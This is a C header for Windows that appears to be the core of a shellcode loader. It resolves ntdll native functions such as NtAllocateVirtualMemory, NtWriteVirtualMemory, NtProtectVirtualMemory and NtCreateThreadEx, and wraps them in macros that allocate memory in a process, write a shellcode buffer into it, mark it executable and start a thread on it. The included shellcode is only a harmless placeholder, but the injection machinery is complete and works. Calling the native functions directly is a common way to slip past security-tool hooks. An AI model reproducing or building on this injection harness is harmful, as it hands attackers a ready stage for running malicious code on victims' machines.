#pragma once
#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

typedef NTSTATUS(NTAPI* PFN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* PFN_NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* PFN_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* PFN_NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

typedef NTSTATUS(NTAPI* PFN_NtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
    );

typedef NTSTATUS(NTAPI* PFN_NtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(NTAPI* PFN_NtClose)(
    HANDLE Handle
    );

PFN_NtAllocateVirtualMemory NtAllocateVirtualMemory;
PFN_NtProtectVirtualMemory NtProtectVirtualMemory;
PFN_NtWriteVirtualMemory NtWriteVirtualMemory;
PFN_NtCreateThreadEx NtCreateThreadEx;
PFN_NtWaitForSingleObject NtWaitForSingleObject;
PFN_NtFreeVirtualMemory NtFreeVirtualMemory;
PFN_NtClose NtClose;

HANDLE processHandle;
PVOID baseAddress;
SIZE_T regionSize;
ULONG allocationType;
ULONG protect;
ULONG oldProtect;
NTSTATUS status;
HANDLE threadHandle;
SIZE_T bytesWritten;

unsigned char shellcode[] = {
    0x48, 0x31, 0xC0, 0xC3
};

#define Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect) \
    do { \
        status = NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize, allocationType, protect); \
        if (status != STATUS_SUCCESS) { \
            printf("NtAllocateVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_WriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize) \
    do { \
        status = NtWriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize, &bytesWritten); \
        if (status != STATUS_SUCCESS || bytesWritten != bufferSize) { \
            printf("NtWriteVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect) \
    do { \
        status = NtProtectVirtualMemory(processHandle, &baseAddress, &regionSize, protect, &oldProtect); \
        if (status != STATUS_SUCCESS) { \
            printf("NtProtectVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_CreateThreadEx(threadHandle, processHandle, baseAddress) \
    do { \
        status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, baseAddress, NULL, FALSE, 0, 0, 0, NULL); \
        if (status != STATUS_SUCCESS) { \
            printf("NtCreateThreadEx failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_WaitForSingleObject(threadHandle) \
    do { \
        status = NtWaitForSingleObject(threadHandle, FALSE, NULL); \
        if (status != STATUS_SUCCESS) { \
            printf("NtWaitForSingleObject failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_Close(handle) \
    do { \
        status = NtClose(handle); \
        if (status != STATUS_SUCCESS) { \
            printf("NtClose failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize) \
    do { \
        status = NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, MEM_RELEASE); \
        if (status != STATUS_SUCCESS) { \
            printf("NtFreeVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
        baseAddress = NULL; \
    } while(0)

BOOL InitNtFunctions() {
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
    if (!hNtDll) {
        printf("Failed to get handle to ntdll.dll\n");
        return FALSE;
    }

    NtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtDll, "NtProtectVirtualMemory");
    NtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
    NtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtDll, "NtCreateThreadEx");
    NtWaitForSingleObject = (PFN_NtWaitForSingleObject)GetProcAddress(hNtDll, "NtWaitForSingleObject");
    NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(hNtDll, "NtFreeVirtualMemory");
    NtClose = (PFN_NtClose)GetProcAddress(hNtDll, "NtClose");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtWriteVirtualMemory ||
        !NtCreateThreadEx || !NtWaitForSingleObject || !NtFreeVirtualMemory || !NtClose) {
        printf("Failed to get address of NT functions\n");
        return FALSE;
    }

    return TRUE;
}
